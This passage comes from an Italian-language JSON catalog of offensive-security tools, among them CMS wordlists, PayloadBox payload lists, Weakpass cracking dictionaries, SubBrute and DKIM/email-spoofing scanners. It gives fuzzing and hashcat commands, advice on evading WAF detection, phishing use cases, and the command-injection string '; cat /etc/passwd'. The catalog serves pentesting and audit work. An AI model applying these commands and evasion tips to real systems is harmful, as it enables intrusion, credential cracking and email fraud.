    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>UltimateCMSWordlists</strong> è una collezione curata di wordlist specifiche per i Content Management System più diffusi. A differenza delle wordlist generiche (es. SecLists), questo progetto si concentra esclusivamente sulle risorse CMS: plugin, temi, utenti, percorsi di amministrazione e configurazioni specifiche per piattaforma. Le liste sono organizzate per CMS e tipologia, permettendo di condurre operazioni di fuzzing e discovery mirate con un tasso di successo superiore rispetto a dizionari generici.</p><br><hr><h4 class=\"rt-purple\">CMS supportati e contenuti</h4><p><strong>WordPress:</strong> Liste dedicate per enumerazione di plugin, temi, utenti e percorsi di installazione. Copertura delle strutture di directory tipiche di WordPress (<code>/wp-content/plugins/</code>, <code>/wp-content/themes/</code>), essenziali per discovery con tool come WPScan, Gobuster o wfuzz.</p><p><strong>Joomla:</strong> Wordlist specifiche per componenti, moduli, template e percorsi di amministrazione Joomla. Utili per identificare estensioni vulnerabili e pannelli di gestione esposti.</p><p><strong>Drupal:</strong> Liste per moduli, temi e percorsi caratteristici dell'architettura Drupal, inclusi endpoint di configurazione e file sensibili come <code>CHANGELOG.txt</code> e <code>settings.php</code>.</p><p><strong>TYPO3:</strong> Wordlist per estensioni e percorsi specifici di TYPO3 (versione 9.x documentata), un CMS enterprise spesso trascurato nelle wordlist standard.</p><p><strong>CRM e altri:</strong> Liste aggiuntive per sistemi CRM e piattaforme meno comuni, ampliando la copertura oltre i CMS tradizionali.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Le wordlist vengono usate come input per tool di content discovery e fuzzing. Il repository può essere clonato localmente e le liste selezionate in base al CMS target identificato durante la fase di fingerprinting.</p><pre><code># Clonazione del repository\ngit clone https://github.com/JavierOlmedo/UltimateCMSWordlists.git\n\n# Discovery plugin WordPress con Gobuster\ngobuster dir -u http://target.com/wp-content/plugins/ -w UltimateCMSWordlists/WordPress/wp-plugins.txt\n\n# Fuzzing componenti Joomla con wfuzz\nwfuzz -w UltimateCMSWordlists/Joomla/joomla-components.txt --hc 404 http://target.com/FUZZ\n\n# Enumerazione moduli Drupal con ffuf\nffuf -w UltimateCMSWordlists/Drupal/drupal-modules.txt -u http://target.com/modules/FUZZ -mc 200,301,403</code></pre><p>Per risultati ottimali, combinare con il fingerprinting CMS preventivo (es. tramite CMSeeK o WhatWeb) per selezionare la wordlist appropriata.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Web Enumeration</strong>, dopo aver identificato il CMS del target, queste wordlist permettono una discovery chirurgica di plugin e temi installati, spesso rivelando componenti vulnerabili non rilevati dagli scanner automatici.</p><p>Per attività di <strong>Bug Bounty</strong>, le liste specifiche per CMS accelerano drasticamente la fase di ricognizione, coprendo percorsi che le wordlist generiche non includono.</p><p>Nei <strong>Security Audit</strong>, consentono di verificare la superficie di attacco completa di un'installazione CMS, identificando estensioni obsolete o abbandonate che rappresentano vettori di compromissione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'uso di wordlist grandi genera un volume elevato di richieste HTTP (principalmente 404 Not Found), facilmente rilevabile da WAF e IDS. I pattern di enumerazione CMS-specifici sono noti e possono triggerare regole di blocco dedicate.</p><p><strong>Mitigazioni:</strong> Utilizzare rate-limiting nei tool di discovery. Iniziare con liste ridotte (top plugin/temi più comuni) prima di passare a enumerazioni esaustive. Combinare con tecniche passive (Wappalyzer, BuiltWith) per ridurre il traffico necessario.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "00_Common",
      "Wordlists",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "liferay-wordlists",
    "name": "Liferay",
    "version": "",
    "icon": "../app/icons/rsmangler-logo.svg",
    "installation": "GitHub",
    "repo": "Kali Linux",
    "desc": "Wordlist di path e endpoint comuni di Liferay Portal per content discovery e fuzzing mirato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Semplice wordlist contenente i percorsi e gli endpoint più comuni delle installazioni <strong>Liferay Portal</strong>. Include URL di amministrazione, API REST/JSON-WS, risorse statiche e file di configurazione tipici del framework, utili per attività di content discovery su target Liferay.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Content discovery con Gobuster\ngobuster dir -u http://target.com -w liferay-paths.txt\n\n# Fuzzing con ffuf\nffuf -w liferay-paths.txt -u http://target.com/FUZZ -mc 200,301,302,403</code></pre>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "payloadbox-wordlists",
    "name": "PayloadBox",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/payload-box",
    "desc": "Raccolta di repository con payload e wordlist offensive organizzate per categoria di vulnerabilità (XSS, SQLi, XXE, SSTI, CRLF e altro).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PayloadBox</strong> è un'organizzazione GitHub che raccoglie e mantiene repository dedicati di payload offensivi, ciascuno focalizzato su una specifica classe di vulnerabilità web. A differenza di raccolte monolitiche come SecLists o PayloadsAllTheThings, ogni repository è autonomo e verticale su un singolo vettore d'attacco, rendendo più semplice la selezione e l'aggiornamento delle liste per attività di fuzzing mirato.</p><br><hr><h4 class=\"rt-purple\">Repository disponibili</h4><p><strong>xss-payload-list:</strong> Collezione completa di payload Cross-Site Scripting, inclusi vettori per bypass WAF, contesti DOM, attributi HTML e polyglot. È il repository più popolare dell'organizzazione.</p><p><strong>sql-injection-payload-list:</strong> Payload per SQL Injection su diversi DBMS (MySQL, PostgreSQL, MSSQL, Oracle), con varianti per UNION-based, blind, time-based e error-based injection.</p><p><strong>command-injection-payload-list:</strong> Vettori di command injection per sistemi Linux e Windows, con tecniche di evasione (encoding, concatenazione, variabili d'ambiente).</p><p><strong>xxe-injection-payload-list:</strong> Payload per XML External Entity injection, inclusi vettori per file read, SSRF e out-of-band data exfiltration.</p><p><strong>ssti-advanced-payload-list:</strong> Payload avanzati per Server-Side Template Injection con copertura di engine multipli (Jinja2, Twig, Freemarker, Velocity) e polyglot per detection automatica.</p><p><strong>directory-payload-list:</strong> Wordlist per directory traversal e path traversal (LFI), con encoding multipli e sequenze di bypass per filtri comuni.</p><p><strong>Altri repository:</strong> csv-injection-payload-list, open-redirect-payload-list, crlf-injection-payload-list, http-request-smuggling-payloads e protocol-injection-payload-list completano la copertura su vettori meno comuni ma altrettanto critici.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Ogni repository può essere clonato singolarmente e usato come input per tool di fuzzing web.</p><pre><code># Clonazione di un singolo repository\ngit clone https://github.com/payload-box/xss-payload-list.git\n\n# Fuzzing XSS con ffuf\nffuf -w xss-payload-list/Intruder/xss-payload-list.txt -u \"http://target.com/search?q=FUZZ\" -mc 200\n\n# SQLi testing con sqlmap custom payload\nsqlmap -u \"http://target.com/page?id=1\" --tamper=space2comment\n\n# Fuzzing generico con wfuzz\nwfuzz -w command-injection-payload-list.txt -d \"cmd=FUZZ\" http://target.com/exec</code></pre><p>Le liste sono già formattate una-per-riga, compatibili con tutti i principali tool di fuzzing (Burp Intruder, ffuf, wfuzz, Gobuster).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Web Exploitation</strong>, i payload organizzati per vulnerabilità permettono di concentrare il fuzzing sul vettore identificato durante l'analisi, aumentando l'efficacia rispetto a liste generiche.</p><p>Per <strong>WAF Bypass Testing</strong>, le varianti con encoding e offuscamento sono preziose per testare la robustezza dei filtri di sicurezza applicativi.</p><p>In attività di <strong>Bug Bounty</strong>, le liste curate e aggiornate coprono payload moderni che i tool automatici potrebbero non includere nelle loro wordlist predefinite.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il fuzzing con payload offensivi genera pattern altamente riconoscibili dai WAF (ModSecurity, Cloudflare, AWS WAF). Molti payload contengono stringhe bannate come <code>&lt;script&gt;</code>, <code>UNION SELECT</code> o <code>; cat /etc/passwd</code> che triggerano regole di blocco immediate.</p><p><strong>Mitigazioni:</strong> Utilizzare liste ridotte e mirate prima di passare a enumerazioni esaustive. Introdurre delay tra le richieste e variare gli header HTTP per ridurre la correlazione. Preferire payload con encoding avanzato per eludere detection basata su pattern matching.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "weakpass-wordlists",
    "name": "Weakpass",
    "version": "",
    "icon": "../app/icons/rsmangler-logo.svg",
    "installation": "Website",
    "repo": "https://weakpass.com/",
    "desc": "Portale di wordlist massive per password cracking, con dizionari aggregati da leak e dump fino a 100+ GB. Al momento installato: Hashkiller.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Weakpass</strong> è un portale di riferimento per il password cracking che aggrega, combina e distribuisce wordlist massive derivate da data breach, dump pubblici e compilazioni comunitarie. Le liste sono ottimizzate per diversi algoritmi di hashing e disponibili in dimensioni scalabili, da pochi MB fino a oltre 100 GB. Il progetto è mantenuto da <strong>zzzteph</strong> ed è una risorsa standard per penetration tester e red teamer che necessitano di dizionari ad alta copertura per attacchi offline.</p><br><hr><h4 class=\"rt-purple\">Wordlist principali</h4><p><strong>Weakpass 2a (28 GB):</strong> La wordlist flagship del progetto. Combina dump storici (RockYou, LinkedIn, Adobe, Collection #1-5), compilazioni come Anti-Public e Breach Compilation, e liste curate dalla community. Ha dimostrato tassi di crack superiori al 35% su hash NTLM in contesti reali di pentest.</p><p><strong>Weakpass 3 (104+ GB):</strong> Versione estesa con copertura quasi totale delle password leaked pubblicamente. Consigliata solo per attacchi su hash veloci (NTLM, MD5) dove il tempo di elaborazione è sostenibile.</p><p><strong>Hashkiller (1.3 GB):</strong> Compilazione più compatta derivata dal database di hashkiller.io, contenente password uniche da crack comunitari. Ottimo compromesso tra dimensione e copertura per attacchi rapidi. <em>Attualmente installata.</em></p><p><strong>Altre liste:</strong> Il portale offre wordlist specializzate per WPA/WPA2 (pattern numerici e frasi comuni), wordlist per lingue specifiche e liste ottimizzate per algoritmi lenti (bcrypt, scrypt, Argon2) dove la dimensione ridotta è critica.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Le wordlist si scaricano dal sito o via torrent e si usano come input per tool di cracking offline.</p><pre><code># Cracking NTLM con Hashcat e Hashkiller\nhashcat -m 1000 ntlm_hashes.txt hashkiller-dict.txt\n\n# Cracking NetNTLMv2 con regole\nhashcat -m 5600 netntlmv2.txt hashkiller-dict.txt -r rules/best64.rule\n\n# Cracking WPA2 con Weakpass dedicata\nhashcat -m 22000 handshake.hc22000 weakpass_wpa.txt\n\n# Cracking con John the Ripper\njohn --wordlist=hashkiller-dict.txt --format=raw-md5 hashes.txt</code></pre><p>Per massimizzare l'efficacia, combinare le wordlist con regole di mutazione (best64, dive, OneRuleToRuleThemAll) che espandono la copertura senza richiedere dizionari ancora più grandi.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Post-Exploitation</strong>, dopo aver ottenuto hash tramite DCSync, SAM dump o Responder, le wordlist Weakpass permettono di recuperare le password in chiaro per facilitare lateral movement e privilege escalation.</p><p>Per <strong>Password Audit</strong> aziendali, consentono di verificare la robustezza delle password dei dipendenti testando gli hash estratti dal Domain Controller contro dizionari realistici basati su leak effettivi.</p><p>In contesti <strong>CTF e lab</strong>, Hashkiller è spesso sufficiente per crackare la maggior parte degli hash proposti, offrendo un equilibrio tra velocità e copertura.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Storage:</strong> Le wordlist più grandi richiedono spazio disco significativo (100+ GB). Pianificare lo storage su SSD per performance ottimali durante il cracking.</p><p><strong>Legalità:</strong> Le wordlist derivano da breach pubblici. L'uso è legittimo in contesti di pentest autorizzato e audit, ma la conservazione e distribuzione dei dati originali dei breach può avere implicazioni legali in alcune giurisdizioni.</p><p><strong>Efficienza:</strong> Per hash con algoritmi lenti (bcrypt, scrypt), preferire wordlist compatte come Hashkiller combinate con regole aggressive, piuttosto che dizionari da 100 GB che richiederebbero settimane di elaborazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "subbrute-77",
    "name": "subbrute-77",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/TheRook/subbrute",
    "desc": "Variante del tool SubBrute per enumerazione sottodomini tramite DNS ricorsivo aperto, utile per bypassare rate-limit.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SubBrute e uno strumento di enumerazione sottodomini che si distingue per l'uso innovativo di una catena di resolver DNS aperti come proxy. Invece di inviare le richieste dall'IP dell'attaccante verso il nameserver autoritativo del target, distribuisce le query attraverso resolver DNS pubblici ricorsivi. Questo offre un duplice vantaggio: maschera l'origine dell'enumerazione e permette di aggirare i rate-limit imposti dal target, poiche ogni richiesta proviene da un IP diverso. Particolarmente efficace contro organizzazioni che implementano difese contro il DNS bruteforcing.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Resolver Chain Distribution:</strong> Utilizza una lista di resolver DNS aperti per distribuire le query su centinaia di IP diversi. Ogni richiesta viene instradata attraverso un resolver differente, rendendo impossibile per il target identificare un singolo attaccante. Include un meccanismo di health-check che verifica la disponibilita dei resolver e scarta quelli non funzionanti.</p><p><strong>Recursive Subdomain Crawling:</strong> Enumera record DNS ricorsivamente, scoprendo sottodomini di sottodomini (es. dev.api.target.com). Fondamentale per mappare infrastrutture dove servizi critici sono nascosti in profondita nella gerarchia DNS.</p><p><strong>Wildcard Detection:</strong> Rileva risposte wildcard DNS e filtra i falsi positivi, garantendo che solo i sottodomini realmente esistenti vengano riportati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script Python con sintassi semplice. Richiede accesso alla porta 53 UDP/TCP.</p><pre><code># Enumerazione base con wordlist integrata\npython subbrute.py target.com\n\n# Uso di lista resolver personalizzata\npython subbrute.py -r custom_resolvers.txt target.com\n\n# Enumerazione con wordlist custom e output su file\npython subbrute.py -s custom_subs.txt -o results.txt target.com\n\n# Enumerazione ricorsiva\npython subbrute.py -r resolvers.txt --rproto tcp target.com</code></pre><p>I risultati possono essere passati in pipe a httpx o nmap per verificare quali sottodomini ospitano servizi attivi.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>External Recon Stealth:</strong> Per mappare l'infrastruttura DNS esterna senza bruciare il proprio IP o essere bloccati. Ideale nelle fasi iniziali di un red team dove la discrezione e prioritaria.</p><p><strong>Bypass protezioni anti-enumeration:</strong> Contro organizzazioni con rate-limiting sui nameserver autoritativi o servizi come Cloudflare. La distribuzione tramite resolver aperti rende inefficaci queste contromisure.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il target vede traffico da molti IP diversi, rendendo difficile il blocco basato su IP sorgente. Tuttavia, il volume anomalo di NXDOMAIN puo essere rilevato da monitoraggio DNS passivo.</p><p><strong>Impatto operativo:</strong> L'uso massiccio di resolver aperti puo causare il blocco del proprio IP da parte di alcuni resolver. Alcuni implementano rate-limiting che rallenta l'enumerazione.</p><p><strong>Mitigazioni:</strong> Aggiornare la lista resolver periodicamente. Usare delay tra le richieste. Combinare con tecniche passive (Certificate Transparency, SecurityTrails) per copertura completa.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dkimsc4n",
    "name": "dkimsc4n",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/vavkamil/dkimsc4n",
    "desc": "Scanner DKIM asincrono basato su wordlist che identifica domini con chiavi RSA 512-bit vulnerabili a fattorizzazione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>dkimsc4n</strong> è uno scanner Python asincrono progettato per identificare domini con configurazioni DKIM deboli. Utilizzando un approccio basato su wordlist, il tool enumera i selettori DKIM di un dominio target e verifica se i record DNS corrispondenti utilizzano chiavi RSA a 512 bit, vulnerabili ad attacchi di fattorizzazione. Questa debolezza crittografica (CWE-326 - Inadequate Encryption Strength) consente a un attaccante di crackare la chiave privata in poche ore con meno di $100 di compute time in cloud pubblico, permettendo di firmare email spoofate come se provenissero dal dominio legittimo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Scansione asincrona:</strong> L'architettura async permette di testare migliaia di selettori DKIM in parallelo con performance elevate, riducendo drasticamente i tempi di scansione rispetto a tool sincroni.</p><p><strong>Enumerazione selettori via wordlist:</strong> Utilizza dizionari di selettori DKIM comuni (default, selector1, selector2, google, k1, ecc.) per scoprire i record TXT pubblicati nel DNS del dominio target sotto <code>[selector]._domainkey.[domain]</code>.</p><p><strong>Validazione crittografica:</strong> Per ogni record DKIM trovato, analizza la lunghezza della chiave RSA pubblica e segnala quelle a 512 bit come vulnerabili. Chiavi di questa dimensione possono essere fattorizzate con strumenti come CADO-NFS o msieve.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Installazione dipendenze\npip install -r requirements.txt\n\n# Scansione di un singolo dominio\npython3 dkimsc4n.py -d target.com\n\n# Scansione con wordlist custom di selettori\npython3 dkimsc4n.py -d target.com -w custom_selectors.txt\n\n# Scansione bulk di domini\npython3 dkimsc4n.py -dL domains.txt</code></pre><p>Se viene trovata una chiave RSA a 512 bit, è possibile fattorizzarla offline e ricostruire la chiave privata per firmare email arbitrarie come il dominio target.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In attività di <strong>Bug Bounty</strong>, la scoperta di chiavi DKIM deboli è una vulnerabilità ad alto impatto che permette email spoofing perfetto, bypassando i controlli DMARC del destinatario.</p><p>Per <strong>Red Teaming</strong>, email firmate con DKIM valido del dominio target aumentano drasticamente la credibilità delle campagne di phishing, superando filtri antispam e controlli di autenticazione.</p><p>In <strong>Security Audit</strong>, permette di verificare che tutte le chiavi DKIM pubblicate dall'organizzazione rispettino i requisiti minimi di lunghezza (≥ 2048 bit raccomandato).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La scansione genera query DNS TXT verso record <code>_domainkey</code>, traffico legittimo ma il volume elevato di query per selettori inesistenti (NXDOMAIN) può essere rilevato da monitoraggio DNS passivo.</p><p><strong>Impatto operativo:</strong> Tool di sola lettura, non modifica alcuna configurazione. La fattorizzazione della chiave avviene offline senza interazione con il target.</p><p><strong>Mitigazioni:</strong> Utilizzare resolver DNS pubblici per distribuire le query. Limitare il rate delle richieste per evitare blocchi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Spoofing_E-mail"
    ],
    "notes": null
  },
  {
    "id": "domain-security-scanner",
    "name": "Domain Security Scanner",
    "version": "3.0.33",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/globalcyberalliance/domain-security-scanner",
    "desc": "Audit DNS completo per email security: verifica configurazioni DMARC, DKIM, SPF, BIMI e TLS con guida alla remediation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Domain Security Scanner</strong> (DSS) è un tool Go sviluppato dalla Global Cyber Alliance per analizzare la postura di sicurezza email di uno o più domini. Verifica la presenza e la correttezza di tutti i principali meccanismi di autenticazione email: <strong>SPF</strong> (Sender Policy Framework), <strong>DKIM</strong> (DomainKeys Identified Mail), <strong>DMARC</strong> (Domain-based Message Authentication, Reporting & Conformance), <strong>BIMI</strong> (Brand Indicators for Message Identification) e <strong>TLS</strong> sui server MX. Per ogni controllo, fornisce raccomandazioni actionable per correggere le misconfigurazioni trovate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Audit multi-protocollo:</strong> In una singola scansione, DSS verifica tutti i livelli di protezione email: record SPF (meccanismi, include, redirect), policy DMARC (p=, sp=, rua=, ruf=), selettori DKIM, record BIMI (logo SVG, VMC) e cifratura TLS sui server MX del dominio.</p><p><strong>Modalità operative multiple:</strong> Funziona come CLI per scansioni puntuali, come server REST API per integrazione in pipeline automatizzate, o come servizio email-based. Supporta scansione bulk di domini multipli in un singolo comando.</p><p><strong>Guida alla remediation:</strong> Non si limita a identificare i problemi: per ogni finding genera raccomandazioni specifiche su come correggere la configurazione, rendendolo utile sia per attaccanti (capire le debolezze) che per difensori (correggere le lacune).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Disponibile come binario precompilato (macOS, Linux, Windows) o immagine Docker.</p><pre><code># Installazione via Go\ngo install github.com/globalcyberalliance/domain-security-scanner/v3/cmd/dss@latest\n\n# Scansione singolo dominio con selettore DKIM specifico\ndss scan target.com --dkimSelector selector1\n\n# Scansione bulk di domini multipli\ndss scan domain1.com domain2.com domain3.com\n\n# Avvio come REST API\ndss serve api --port 8080\n\n# Via Docker\ndocker run ghcr.io/globalcyberalliance/domain-security-scanner:latest scan target.com</code></pre><p>L'output mostra lo stato di ogni controllo (pass/fail/warning) con dettagli tecnici sui record DNS trovati e le raccomandazioni per la correzione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Reconnaissance</strong>, DSS permette di valutare rapidamente la postura di email security di un target, identificando se è possibile inviare email spoofate (assenza di DMARC con p=reject, SPF permissivo, DKIM assente).</p><p>Per <strong>Phishing Assessment</strong>, i risultati indicano quale livello di sofisticazione è necessario per un attacco email credibile: un dominio senza DMARC è triviale da spoofare, mentre uno con DMARC+DKIM richiede tecniche più avanzate.</p><p>In <strong>Security Audit e Compliance</strong>, genera report completi sulla conformità email dell'organizzazione, utili per framework come NIST, CIS Controls e requisiti assicurativi cyber.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La scansione genera query DNS standard (TXT, MX) e connessioni TLS ai server MX. Il traffico è identico a quello di un mail server legittimo, quindi praticamente invisibile.</p><p><strong>Impatto operativo:</strong> Tool di sola lettura. Le connessioni TLS ai server MX sono non intrusive e non inviano email.</p><p><strong>Mitigazioni:</strong> Nessuna precauzione particolare necessaria. Le query DNS sono indistinguibili dal traffico normale.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Spoofing_E-mail"
    ],
    "notes": null
  },
  {
    "id": "fast-dkim-scanner",
    "name": "Fast DKIM Scanner",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/OscarBataille/Fast-DKIM-Scanner",
    "desc": "Scanner DKIM ad alte prestazioni che usa massdns per brute-force selettori e identificazione chiavi RSA deboli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Fast DKIM Scanner</strong> è un tool Python per la discovery e l'analisi di selettori DKIM con un focus sulle performance. A differenza di scanner DKIM tradizionali, sfrutta <strong>massdns</strong> come backend per le risoluzioni DNS, permettendo di testare centinaia di migliaia di selettori in tempi drasticamente ridotti. Include un generatore intelligente di liste di selettori personalizzate basate sul nome del dominio target, aumentando la probabilità di trovare selettori non standard.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Generazione selettori custom:</strong> Lo script <code>generate_dkim_selectors.py</code> crea wordlist di selettori personalizzate basate sul dominio target, combinando pattern comuni (selector1, default, k1, google) con varianti derivate dal nome del dominio stesso (prefissi, abbreviazioni, date).</p><p><strong>Risoluzione DNS massiva via massdns:</strong> Invece di risolvere i record DNS uno alla volta, delega le query a massdns che gestisce decine di migliaia di risoluzioni parallele, rendendo il tool ordini di grandezza più veloce di alternative come dkimsc4n per scansioni su larga scala.</p><p><strong>Rilevamento chiavi deboli:</strong> Analizza le chiavi RSA pubbliche trovate nei record DKIM e segnala quelle con lunghezza insufficiente (512/768 bit), vulnerabili a fattorizzazione offline.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python 3 con le librerie <code>tldextract</code> e <code>cryptography</code>, più massdns installato. Uno script di setup automatizza l'installazione.</p><pre><code># Setup automatico delle dipendenze\n./setup.sh\n\n# Generazione lista selettori personalizzata per il dominio\npython3 generate_dkim_selectors.py target.com > dkim_selectors.txt\n\n# Scansione DKIM del dominio\npython3 get_dkim_from_domain.py target.com\n\n# Workflow completo: genera selettori + scansione\npython3 generate_dkim_selectors.py target.com > selectors.txt && python3 get_dkim_from_domain.py target.com</code></pre><p>I risultati mostrano i selettori trovati, la lunghezza delle chiavi RSA e un flag per le chiavi vulnerabili.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Bug Bounty su larga scala</strong>, la velocità di massdns permette di scansionare centinaia di domini in pochi minuti, identificando rapidamente target con chiavi DKIM deboli su programmi con scope ampio.</p><p>In fase di <strong>Reconnaissance email</strong>, la generazione di selettori custom aumenta la superficie di scoperta rispetto a wordlist generiche, trovando selettori non standard che altri scanner non testano.</p><p>Come complemento a <strong>dkimsc4n</strong>, offre velocità superiore sulle scansioni massive sacrificando la semplicità d'uso in favore di un workflow a due step (generazione + scansione).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> massdns genera un volume molto elevato di query DNS in breve tempo, facilmente rilevabile da monitoraggio DNS. I resolver pubblici possono applicare rate-limiting o blocchi sull'IP sorgente.</p><p><strong>Impatto operativo:</strong> L'alto volume di query può saturare resolver DNS locali o causare blocchi temporanei. Utilizzare liste di resolver diversificati.</p><p><strong>Mitigazioni:</strong> Configurare il rate-limit di massdns. Utilizzare la lista di resolver di trickest/resolvers per distribuire il carico. Eseguire le scansioni in orari a basso traffico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Spoofing_E-mail"
    ],
    "notes": null
  },
  {
    "id": "spoofy",
    "name": "Spoofy",
    "version": "1.0.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/MattKeeley/Spoofy",
    "desc": "Analizza la spoofability di domini email verificando configurazioni SPF, DMARC e DKIM con matrice di deliverability testata empiricamente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Spoofy</strong> è un tool Python che determina se un dominio è vulnerabile all'email spoofing analizzando le configurazioni SPF, DMARC e DKIM. La sua unicità risiede nel fatto che le valutazioni non si basano su ipotesi teoriche, ma su una <strong>matrice di deliverability testata empiricamente</strong> su Microsoft 365, Gmail e Protonmail. Ogni combinazione di configurazione SPF/DMARC è stata verificata in scenari reali per determinare se un'email spoofata verrebbe effettivamente consegnata, rendendo i risultati molto più affidabili di scanner puramente basati su policy.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Matrice di spoofability empirica:</strong> Il cuore del tool è una tabella master che cataloga ogni combinazione rilevante di configurazione SPF/DMARC e il risultato reale di deliverability osservato sui principali provider email. Questo approccio elimina i falsi positivi tipici degli scanner che valutano le policy in isolamento.</p><p><strong>Query DNS autoritativi:</strong> Esegue lookup DNS direttamente sui nameserver autoritativi del dominio, con fallback su Cloudflare, garantendo risultati accurati non influenzati da cache DNS.</p><p><strong>Analisi SPF approfondita:</strong> Conta il numero di query DNS generate dalla catena SPF (include, redirect, a, mx), verificando se il dominio supera il limite di 10 lookup che causa il permerrore SPF.</p><p><strong>Enumerazione DKIM opzionale:</strong> Dalla versione 1.0.3, supporta la discovery di selettori DKIM via API, aggiungendo un ulteriore livello di analisi alla valutazione di spoofability.</p><p><strong>Output multi-formato:</strong> Risultati esportabili in stdout, Excel o JSON, con supporto per scansione bulk di domini da file con threading configurabile.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python 3 e le dipendenze dal file requirements.txt. Installabile anche via pip/pipx.</p><pre><code># Installazione\npip3 install -r requirements.txt\n\n# Scansione singolo dominio\n./spoofy.py -d target.com -t 10\n\n# Scansione bulk da file con output Excel\n./spoofy.py -iL domains.txt -o xls\n\n# Scansione con enumerazione DKIM e output JSON\n./spoofy.py -iL domains.txt -o json --dkim\n\n# Scansione con threading elevato\n./spoofy.py -iL domains.txt -t 50 -o json</code></pre><p>L'output classifica ogni dominio con un livello di spoofability (Spoofable, Potentially Spoofable, Not Spoofable) basato sulla matrice empirica.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Reconnaissance pre-phishing</strong>, Spoofy è il tool definitivo per valutare se un dominio target è spoofabile prima di pianificare una campagna di social engineering, evitando di sprecare tempo su domini ben protetti.</p><p>Per <strong>Red Teaming</strong>, la scansione bulk di tutti i domini dell'organizzazione target (inclusi domini secondari e acquisiti) rivela spesso domini dimenticati con configurazioni email deboli, perfetti per campagne di spear-phishing.</p><p>In <strong>Security Audit email</strong>, fornisce una valutazione oggettiva e basata su evidenze della protezione anti-spoofing, con risultati direttamente confrontabili con la deliverability reale sui provider più usati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La scansione genera query DNS standard (TXT per SPF/DMARC/DKIM, MX), traffico indistinguibile da operazioni email legittime. Nessun alert su IDS/IPS.</p><p><strong>Impatto operativo:</strong> Tool di sola lettura. Non invia email di test né interagisce con i server SMTP del target. L'enumerazione DKIM opzionale genera query DNS aggiuntive.</p><p><strong>Mitigazioni:</strong> Nessuna precauzione particolare necessaria per la scansione base. Per l'enumerazione DKIM, applicare le stesse considerazioni di rate-limiting degli scanner DKIM dedicati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
